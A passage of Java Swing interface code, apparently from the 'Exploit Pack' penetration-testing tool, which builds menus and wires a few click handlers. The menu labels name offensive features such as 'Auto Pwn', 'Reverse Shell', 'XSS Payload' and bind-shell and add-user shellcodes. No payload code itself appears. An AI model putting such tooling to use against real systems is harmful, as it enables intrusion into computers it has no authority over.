        jMenuItem8.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem8ActionPerformed(evt);
            }
        });
        jMenu2.add(jMenuItem8);

        jMenuItem9.setAction(new DefaultEditorKit.PasteAction());
        jMenuItem9.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_P, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem9.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134460_page_white_paste.png"))); // NOI18N
        jMenuItem9.setText("Paste");
        jMenu2.add(jMenuItem9);

        jMenuBar1.add(jMenu2);

        jMenu3.setText("Modules");

        jMenuItem10.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_M, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.SHIFT_MASK));
        jMenuItem10.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316133906_package.png"))); // NOI18N
        jMenuItem10.setText("Show modules");
        jMenuItem10.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem10ActionPerformed(evt);
            }
        });
        jMenu3.add(jMenuItem10);
        jMenu3.add(jSeparator50);

        jMenuItem12.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_R, java.awt.event.InputEvent.ALT_MASK));
        jMenuItem12.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/updatemanager.png"))); // NOI18N
        jMenuItem12.setText("Refresh modules");
        jMenuItem12.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem12ActionPerformed(evt);
            }
        });
        jMenu3.add(jMenuItem12);

        jMenuItem62.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_R, java.awt.event.InputEvent.ALT_MASK));
        jMenuItem62.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/updatemanager.png"))); // NOI18N
        jMenuItem62.setText("Refresh targets");
        jMenuItem62.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem62ActionPerformed(evt);
            }
        });
        jMenu3.add(jMenuItem62);

        jMenuBar1.add(jMenu3);

        jMenu4.setText("Tools");

        jMenuItem11.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_T, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem11.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/terminal.png"))); // NOI18N
        jMenuItem11.setText("Console");
        jMenuItem11.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem11ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem11);
        jMenu4.add(jSeparator17);

        jMenuItem13.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_M, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem13.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/robotauto.png"))); // NOI18N
        jMenuItem13.setText("Auto Pwn");
        jMenuItem13.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem13ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem13);
        jMenu4.add(jSeparator16);

        jMenuItem60.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem60.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/bugbug.png"))); // NOI18N
        jMenuItem60.setText("Reverse Shell");
        jMenuItem60.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem60ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem60);
        jMenu4.add(jSeparator48);

        jMenuItem59.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem59.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/agent.png"))); // NOI18N
        jMenuItem59.setText("Exploit Wizard");
        jMenuItem59.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem59ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem59);

        jMenuItem58.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem58.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1476380776_internet-web-browser.png"))); // NOI18N
        jMenuItem58.setText("XSS Payload");
        jMenuItem58.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem58ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem58);

        jMenuItem61.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem61.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/networking2.png"))); // NOI18N
        jMenuItem61.setText("Network mapper");
        jMenuItem61.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem61ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem61);
        jMenu4.add(jSeparator49);

        jMenuItem14.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem14.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/options.png"))); // NOI18N
        jMenuItem14.setText("Edit preferences");
        jMenuItem14.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem14ActionPerformed(evt);
            }
        });
        jMenu4.add(jMenuItem14);

        jMenuBar1.add(jMenu4);

        jMenu5.setText("Run");

        jMenuItem15.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_R, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem15.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/run.png"))); // NOI18N
        jMenuItem15.setText("Resume");
        jMenu5.add(jMenuItem15);

        jMenuItem16.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem16.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/stop.png"))); // NOI18N
        jMenuItem16.setText("Stop");
        jMenu5.add(jMenuItem16);
        jMenu5.add(jSeparator18);

        jMenuItem17.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_D, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem17.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/reportbug.png"))); // NOI18N
        jMenuItem17.setText("Debug");
        jMenu5.add(jMenuItem17);
        jMenu5.add(jSeparator28);

        jMenuItem44.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_A, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.SHIFT_MASK));
        jMenuItem44.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/robotauto.png"))); // NOI18N
        jMenuItem44.setText("AutoPwn");
        jMenuItem44.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem44ActionPerformed(evt);
            }
        });
        jMenu5.add(jMenuItem44);

        jMenuBar1.add(jMenu5);

        jMenu6.setText("Update");

        jMenuItem18.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_U, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem18.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/checkupdate.png"))); // NOI18N
        jMenuItem18.setText("Check for updates");
        jMenuItem18.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem18ActionPerformed(evt);
            }
        });
        jMenu6.add(jMenuItem18);

        jMenuBar1.add(jMenu6);

        jMenu8.setText("Exploit Dev");

        jMenu9.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/scriptgreen.png"))); // NOI18N
        jMenu9.setText("Shellcodes");

        jMenu10.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/windowslogo.png"))); // NOI18N
        jMenu10.setText("Windows");

        jMenuItem25.setText("x86.w32.adduser");
        jMenuItem25.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem25ActionPerformed(evt);
            }
        });
        jMenu10.add(jMenuItem25);

        jMenuItem26.setText("x86.w32.tcp4444");
        jMenuItem26.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem26ActionPerformed(evt);
            }
        });
        jMenu10.add(jMenuItem26);

        jMenuItem27.setText("x86.w32.cmd");
        jMenuItem27.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem27ActionPerformed(evt);
            }
        });
        jMenu10.add(jMenuItem27);

        jMenuItem28.setText("x86.w32.egghunter");
        jMenuItem28.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem28ActionPerformed(evt);
            }
        });
        jMenu10.add(jMenuItem28);

        jMenuItem29.setText("x86.w32.msg");
        jMenuItem29.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem29ActionPerformed(evt);
            }
        });
        jMenu10.add(jMenuItem29);

        jMenu9.add(jMenu10);

        jMenu12.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/linuxlogo.png"))); // NOI18N
        jMenu12.setText("GNU/Linux");

        jMenuItem30.setText("x86.linux.bind4444");
        jMenuItem30.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem30ActionPerformed(evt);
            }
        });
        jMenu12.add(jMenuItem30);

        jMenuItem31.setText("x86.linux.adduser");
        jMenuItem31.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem31ActionPerformed(evt);
            }
        });
        jMenu12.add(jMenuItem31);

        jMenuItem32.setText("x86.linux.bindsh");
        jMenuItem32.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem32ActionPerformed(evt);
            }
        });
        jMenu12.add(jMenuItem32);

        jMenu9.add(jMenu12);

        jMenu13.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/bsdlogo.png"))); // NOI18N
        jMenu13.setText("BSD");

        jMenuItem33.setText("x86.bsd.bind4444");
        jMenuItem33.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem33ActionPerformed(evt);
            }
        });
        jMenu13.add(jMenuItem33);

        jMenuItem34.setText("x86.bsd.suidsh");
        jMenuItem34.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem34ActionPerformed(evt);
            }
        });
        jMenu13.add(jMenuItem34);

        jMenu9.add(jMenu13);

        jMenu14.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/maclogo.png"))); // NOI18N
        jMenu14.setText("Mac OSX");

        jMenuItem35.setText("x86.osx.bind4444");
        jMenuItem35.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem35ActionPerformed(evt);
            }
        });
        jMenu14.add(jMenuItem35);

        jMenuItem36.setText("x86.osx.adduser");
        jMenuItem36.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem36ActionPerformed(evt);
            }
        });
        jMenu14.add(jMenuItem36);

        jMenuItem37.setText("x86.osx.bindsh");
        jMenuItem37.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem37ActionPerformed(evt);
            }
        });
        jMenu14.add(jMenuItem37);

        jMenuItem38.setText("x86.osx.reboot");
        jMenuItem38.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem38ActionPerformed(evt);
            }
        });
        jMenu14.add(jMenuItem38);

        jMenu9.add(jMenu14);

        jMenu8.add(jMenu9);
        jMenu8.add(jSeparator26);

        jMenu15.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/opcode.png"))); // NOI18N
        jMenu15.setText("Junk code");

        jMenuItem39.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418843055_bug.png"))); // NOI18N
        jMenuItem39.setText("NOPsled x90");
        jMenuItem39.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem39ActionPerformed(evt);
            }
        });
        jMenu15.add(jMenuItem39);

        jMenuItem40.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418843055_bug.png"))); // NOI18N
        jMenuItem40.setText("NOPsled x60");
        jMenuItem40.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem40ActionPerformed(evt);
            }
        });
        jMenu15.add(jMenuItem40);

        jMenuItem41.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418843055_bug.png"))); // NOI18N
        jMenuItem41.setText("A's x41");
        jMenuItem41.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem41ActionPerformed(evt);
            }
        });
        jMenu15.add(jMenuItem41);

        jMenuItem42.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418843055_bug.png"))); // NOI18N
        jMenuItem42.setText("B's x42");
        jMenuItem42.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem42ActionPerformed(evt);
            }
        });
        jMenu15.add(jMenuItem42);

        jMenu8.add(jMenu15);

        jMenu18.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/shellcodescript.png"))); // NOI18N
        jMenu18.setText("Pattern");

        jMenuItem65.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418844177_notepad_(edit)_16x16.gif"))); // NOI18N
        jMenuItem65.setText("Add pattern");
        jMenuItem65.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem65ActionPerformed(evt);
            }
        });
        jMenu18.add(jMenuItem65);

        jMenuItem66.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1421275146_10_Search_16x16.png"))); // NOI18N
        jMenuItem66.setText("Check offset");
        jMenuItem66.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem66ActionPerformed(evt);
            }
        });
        jMenu18.add(jMenuItem66);

        jMenu8.add(jMenu18);

        jMenuBar1.add(jMenu8);

        jMenu11.setText("Websites");

        jMenuItem50.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_T, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem50.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1429284529_text-html.png"))); // NOI18N
        jMenuItem50.setText("Exploit Pack");
        jMenuItem50.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem50ActionPerformed(evt);
            }
        });
        jMenu11.add(jMenuItem50);
        jMenu11.add(jSeparator31);

        jMenuItem51.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_M, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem51.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1429284529_text-html.png"))); // NOI18N
        jMenuItem51.setText("Corelan Team");
        jMenuItem51.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem51ActionPerformed(evt);
            }
        });
        jMenu11.add(jMenuItem51);
        jMenu11.add(jSeparator32);

        jMenuItem52.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem52.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1429284529_text-html.png"))); // NOI18N
        jMenuItem52.setText("Exploit - DB");
        jMenuItem52.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem52ActionPerformed(evt);
            }
        });
        jMenu11.add(jMenuItem52);
        jMenu11.add(jSeparator33);

        jMenuItem53.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem53.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1429284529_text-html.png"))); // NOI18N
        jMenuItem53.setText("Security Focus");
        jMenuItem53.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem53ActionPerformed(evt);
            }
        });
        jMenu11.add(jMenuItem53);
        jMenu11.add(jSeparator34);

        jMenuItem54.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem54.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1429284529_text-html.png"))); // NOI18N
        jMenuItem54.setText("Full Disclosure");
        jMenuItem54.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem54ActionPerformed(evt);
            }
        });
        jMenu11.add(jMenuItem54);

        jMenuBar1.add(jMenu11);

        jMenu16.setText("Packs");

        jMenuItem55.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_T, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem55.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/buglittle.png"))); // NOI18N
        jMenuItem55.setText("Get a Pack");
        jMenuItem55.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem55ActionPerformed(evt);
            }
        });
        jMenu16.add(jMenuItem55);
        jMenu16.add(jSeparator35);

        jMenuItem56.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_M, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem56.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/square-facebook-16.png"))); // NOI18N
        jMenuItem56.setText("Facebook");
        jMenuItem56.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem56ActionPerformed(evt);
            }
        });
        jMenu16.add(jMenuItem56);

        jMenuBar1.add(jMenu16);

        jMenu7.setText("Help");

        jMenuItem19.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_H, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem19.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/users.png"))); // NOI18N
        jMenuItem19.setText("Support tickets");
        jMenuItem19.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem19ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem19);
        jMenu7.add(jSeparator36);

        jMenuItem57.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_H, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem57.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1408642562_Help_Circle_Blue.png"))); // NOI18N
        jMenuItem57.setText("Getting started");
        jMenuItem57.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem57ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem57);

        jMenuItem20.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_B, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.SHIFT_MASK));
        jMenuItem20.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1408642791_internet-group-chat.png"))); // NOI18N
        jMenuItem20.setText("Online Exploit Pack Manual");
        jMenuItem20.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem20ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem20);
        jMenu7.add(jSeparator19);

        jMenuItem21.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/checkupdate.png"))); // NOI18N
        jMenuItem21.setText("Update manager");
        jMenuItem21.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem21ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem21);

        jMenuItem22.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/about.png"))); // NOI18N
        jMenuItem22.setText("GPLv3 License");
        jMenuItem22.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem22ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem22);
        jMenu7.add(jSeparator21);

        jMenuItem23.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/registerkey.png"))); // NOI18N
        jMenuItem23.setText("Register your copy");
        jMenuItem23.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem23ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem23);
        jMenu7.add(jSeparator20);

        jMenuItem43.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134599_chart_bar.png"))); // NOI18N
        jMenuItem43.setText("View log");
        jMenuItem43.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem43ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem43);
        jMenu7.add(jSeparator27);

        jMenuItem24.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_H, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem24.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/buglittle.png"))); // NOI18N
        jMenuItem24.setText("About Exploit Pack");
        jMenuItem24.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem24ActionPerformed(evt);
            }
        });
        jMenu7.add(jMenuItem24);

        jMenuBar1.add(jMenu7);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jButtonExecution, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jPanel21, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jPanel22, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jTabbedPane1)
                            .addComponent(jPanel5, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addContainerGap())
                    .addComponent(jTabbedPane)))
            .addComponent(jToolBar1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(jToolBar1, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButtonExecution, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(10, 10, 10))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jTabbedPane)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                .addComponent(jPanel22, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addComponent(jPanel21, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(jTabbedPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 151, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(0, 0, 0)
                                .addComponent(jPanel5, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addContainerGap())))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jMenuItem2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem2ActionPerformed
        // TODO add your handling code here:
        NewProject.main(null);
    }//GEN-LAST:event_jMenuItem2ActionPerformed

    private void jMenuItem6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem6ActionPerformed
        // TODO add your handling code here:
        ShellWizard.main(null);
    }//GEN-LAST:event_jMenuItem6ActionPerformed

    private void jMenuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem1ActionPerformed
        // TODO add your handling code here:
        System.exit(0);
    }//GEN-LAST:event_jMenuItem1ActionPerformed

    private void jMenuItem10ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem10ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jMenuItem10ActionPerformed

    private void jMenuItem44ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem44ActionPerformed
        // TODO add your handling code here:
        AutoPwn.main(null);
    }//GEN-LAST:event_jMenuItem44ActionPerformed

